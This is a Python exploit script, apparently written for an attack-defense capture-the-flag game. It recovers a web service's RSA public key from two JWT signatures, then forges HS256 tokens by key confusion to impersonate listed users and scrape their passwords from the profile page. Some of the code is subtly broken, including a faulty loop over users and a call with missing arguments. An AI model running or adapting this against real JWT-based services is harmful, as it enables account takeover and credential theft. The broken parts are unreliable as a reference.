#!/usr/bin/env python3
import sys
import json
import base64
from gmpy2 import mpz,gcd,c_div
import binascii
from Crypto.Hash import SHA256, SHA384, SHA512
from Crypto.Signature import PKCS1_v1_5
import asn1tools
import binascii
import time
import hmac
import hashlib
import random
from string import ascii_letters
import requests
from bs4 import BeautifulSoup


#ip = '10.10.10.1'
ip = sys.argv[1]
port = 8785
N = 100  # number of jwts to generate

forcad_ip = '10.10.10.10'
def get_attack_data():
    return requests.get(f"http://{forcad_ip}/api/client/attack_data").json()['games'][ip]

print("Running exploit...")

def b64urldecode(b64):
    return base64.urlsafe_b64decode(b64+("="*(len(b64) % 4)))

def b64urlencode(m):
    return base64.urlsafe_b64encode(m).strip(b"=")

def bytes2mpz(b):
    return mpz(int(binascii.hexlify(b),16))


def der2pem(der, token="RSA PUBLIC KEY"):
    der_b64=base64.b64encode(der).decode('ascii')

    lines=[ der_b64[i:i+64] for i in range(0, len(der_b64), 64) ]
    return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (token, "\n".join(lines), token)


def forge_mac(jwt0, public_key, user_ids, usernames):
    jwt0_parts=jwt0.encode('utf8').split(b'.')
    jwt0_msg=b'.'.join(jwt0_parts[0:2])

    alg=b64urldecode(jwt0_parts[0].decode('utf8'))
    # Always use HS256
    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256").replace(b"RS384", b"HS256").replace(b"RS512", b"HS256"))

    payload=json.loads(b64urldecode(jwt0_parts[1].decode('utf8')))
    tampered_jwts = []
    # Edit here!!!!
    # Edit here!!!!
    # Edit here!!!!
    # Edit here!!!!
    for uid, uname in user_ids,usernames:
        payload['user_id'] = uid
        payload['username'] = uname
        payload_encoded=b64urlencode(json.dumps(payload).encode('utf8'))
        tamper_hmac=b64urlencode(hmac.HMAC(public_key,b'.'.join([alg_tampered, payload_encoded]),hashlib.sha256).digest())
        jwt_tampered=b'.'.join([alg_tampered, payload_encoded, tamper_hmac])
        tampered_jwts.append(jwt_tampered)
    return tampered_jwts

# e=mpz(65537) # Can be a couple of other common values

username1 = "".join([random.choice(ascii_letters) for i in range(10)])
username2 = "".join([random.choice(ascii_letters) for i in range(10)])
password = "".join([random.choice(ascii_letters) for i in range(10)])

requests.post(f"http://{ip}:{port}/register", data={'username': username1 + "@mail.ru", 'password': password, 'username': username1})
requests.post(f"http://{ip}:{port}/register", data={'username': username2 + "@mail.ru", 'password': password, 'username': username2})

with requests.session() as s:
    rp = f"username={username1}@mail.ru&password={password}"
    r =s.post(f"http://{ip}:{port}/login", data=rp, headers={"Content-Type": "application/x-www-form-urlencoded"})
    jwt0 = s.cookies['session']
with requests.session() as s:
    rp = f"username={username2}@mail.ru&password={password}"
    r =s.post(f"http://{ip}:{port}/auth/jwt/login", data=rp, headers={"Content-Type": "application/x-www-form-urlencoded"})
    jwt1 = s.cookies['session']

alg0=json.loads(b64urldecode(jwt0.split('.')[0]))
alg1=json.loads(b64urldecode(jwt1.split('.')[0]))

if not alg0["alg"].startswith("RS") or not alg1["alg"].startswith("RS"):
    raise Exception("Not RSA signed tokens!")
if alg0["alg"] == "RS256":
    HASH = SHA256
elif alg0["alg"] == "RS384":
    HASH = SHA384
elif alg0["alg"] == "RS512":
    HASH = SHA512
else:
    raise Exception("Invalid algorithm")
jwt0_sig_bytes = b64urldecode(jwt0.split('.')[2])
jwt1_sig_bytes = b64urldecode(jwt1.split('.')[2])
if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
    raise Exception("Signature length mismatch") # Based on the mod exp operation alone, there may be some differences!

jwt0_sig = bytes2mpz(jwt0_sig_bytes)
jwt1_sig = bytes2mpz(jwt1_sig_bytes)

jks0_input = ".".join(jwt0.split('.')[0:2])
hash_0=HASH.new(jks0_input.encode('ascii'))
padded0 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(hash_0, len(jwt0_sig_bytes))

jks1_input = ".".join(jwt1.split('.')[0:2])
hash_1=HASH.new(jks1_input.encode('ascii'))
padded1 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(hash_1, len(jwt0_sig_bytes))

m0 = bytes2mpz(padded0)
m1 = bytes2mpz(padded1)

pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
x509 = asn1tools.compile_files('x509.asn', codec='der')

jwts=[]
user_ids = []
usernames = []

attack_data = get_attack_data()
for pair in attack_data:
        id, user = pair.split(':')
        user_ids.append(id)
        usernames.append(user)


for e in [mpz(3),mpz(65537)]:
    gcd_res = gcd(pow(jwt0_sig, e)-m0,pow(jwt1_sig, e)-m1)
    for my_gcd in range(1,100):
        my_n=c_div(gcd_res, mpz(my_gcd))
        if pow(jwt0_sig, e, my_n) == m0:
            pkcs1_pubkey=pkcs1.encode("RSAPublicKey", {"modulus": int(my_n), "publicExponent": int(e)})
            x509_der=x509.encode("PublicKeyInfo",{"publicKeyAlgorithm":{"algorithm":"1.2.840.113549.1.1.1","parameters":None},"publicKey":(pkcs1_pubkey, len(pkcs1_pubkey)*8)})
            pem_name = "%s_%d_x509.pem" % (hex(my_n)[2:18], e)
            with open(pem_name, "wb") as pem_out:
                public_key=der2pem(x509_der, token="PUBLIC KEY").encode('ascii')
                pem_out.write(public_key)
                jwts.append(forge_mac(jwt0, public_key))
            pem_name = "%s_%d_pkcs1.pem" % (hex(my_n)[2:18], e)
            with open(pem_name, "wb") as pem_out:
                public_key=der2pem(pkcs1_pubkey).encode('ascii')
                pem_out.write(public_key)
                jwts.append(forge_mac(jwt0, public_key, user_ids, usernames))

for possible_set in jwts:
    for possible in possible_set:
        try:
            burp0_url = f"http://{ip}:8785/profile"
            burp0_cookies = {"session": possible.decode()}
            burp0_headers = {"sec-ch-ua": "\"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:8785/choose_game", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
            res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
            soup = BeautifulSoup(res.text, 'html.parser')

            print(soup.find(id='password')['value'], flush=True)
        except:
            pass



